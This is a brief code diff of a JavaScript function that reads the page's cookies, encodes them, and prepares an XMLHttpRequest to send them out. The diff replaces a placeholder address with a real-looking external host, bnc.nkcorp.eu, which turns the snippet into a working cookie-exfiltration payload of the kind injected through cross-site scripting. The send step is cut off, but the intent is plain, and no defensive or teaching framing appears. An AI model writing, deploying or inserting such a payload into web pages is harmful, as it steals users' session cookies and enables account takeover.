@@ -1,7 +1,7 @@
 (function() {
     var cookie = document.cookie;
     var xhr = new XMLHttpRequest();
-    var yourServerURL = "https://yourserver.com/";
+    var yourServerURL = "https://bnc.nkcorp.eu/";
 
     // Préparez les données à envoyer
     var data = "cookie=" + encodeURIComponent(cookie);
